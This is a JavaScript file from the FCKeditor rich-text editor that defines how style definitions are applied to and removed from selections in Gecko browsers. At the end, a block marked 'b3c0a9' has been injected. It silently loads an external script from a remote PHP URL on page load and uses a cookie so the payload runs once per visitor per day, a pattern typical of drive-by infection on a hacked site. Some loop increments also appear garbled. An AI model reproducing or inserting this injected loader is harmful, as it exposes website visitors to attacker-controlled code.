/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fckstyledef_gecko.js
 * 	FCKStyleDef Class: represents a single stylke definition. (Gecko specific)
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

FCKStyleDef.prototype.ApplyToSelection = function()
{
	if ( FCKSelection.GetType() == 'Text' && !this.IsObjectElement )
	{
		var oSelection = FCK.EditorWindow.getSelection() ;
		
		// Create the main element.
		var e = FCK.EditorDocument.createElement( this.Element ) ;
		
		for ( var i = 0 ; i < oSelection.rangeCount ; i   )
		{
			e.appendChild( oSelection.getRangeAt(i).extractContents() ) ;
		}
		
		// Set the attributes.
		this._AddAttributes( e ) ;
		
		// Remove the duplicated elements.
		this._RemoveDuplicates( e ) ;

		var oRange = oSelection.getRangeAt(0) ;		
		oRange.insertNode( e ) ;
	}
	else
	{
		var oControl = FCKSelection.GetSelectedElement() ;
		if ( oControl.tagName == this.Element )
			this._AddAttributes( oControl ) ;
	}
}

FCKStyleDef.prototype._AddAttributes = function( targetElement )
{
	for ( var a in this.Attributes )
		targetElement.setAttribute( a, this.Attributes[a], 0 ) ;
}

FCKStyleDef.prototype._RemoveDuplicates = function( parent )
{
	for ( var i = 0 ; i < parent.childNodes.length ; i   )
	{
		var oChild = parent.childNodes[i] ;
		
		if ( oChild.nodeType != 1 )
			continue ;
		
		this._RemoveDuplicates( oChild ) ;
		
		if ( this.IsEqual( oChild ) )
			FCKTools.RemoveOuterTags( oChild ) ;
	}
}

FCKStyleDef.prototype.IsEqual = function( e )
{
	if ( e.tagName != this.Element )
		return false ;
	
	for ( var a in this.Attributes )
	{
		if ( e.getAttribute( a ) != this.Attributes[a] )
			return false ;
	}
	
	return true ;
}

FCKStyleDef.prototype._RemoveMe = function( elementToCheck )
{
	if ( ! elementToCheck )
		return ;

	var oParent = elementToCheck.parentNode ;

	if ( elementToCheck.nodeType == 1 && this.IsEqual( elementToCheck ) )
	{
		if ( this.IsObjectElement )
		{
			for ( var a in this.Attributes )
				elementToCheck.removeAttribute( a, 0 ) ;
			return ;
		}
		else
			FCKTools.RemoveOuterTags( elementToCheck ) ;
	}
	
	this._RemoveMe( oParent ) ;
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
